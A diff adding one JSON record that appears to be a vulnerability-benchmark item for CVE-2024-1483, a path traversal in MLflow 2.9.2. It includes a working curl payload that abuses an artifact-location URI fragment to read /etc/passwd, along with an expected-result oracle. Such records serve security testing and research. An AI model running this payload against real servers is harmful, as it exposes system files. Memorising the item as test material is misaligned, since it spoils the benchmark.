@@ -1,0 +1,15 @@
+{
+  "file_id": "173_mlflow_huntr_52a3855d-93ff-4460-ac24-9c7e4334198d",
+  "numeric_id": "173",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path Traversal vulnerability in MLflow due to improper validation of URI fragment in artifact location",
+  "cve": "CVE-2024-1483",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "== 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"file://localhost#../../etc/passwd\"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/artifact-locations/create'",
+  "oracle": "Server returns the content of /etc/passwd file"
+}
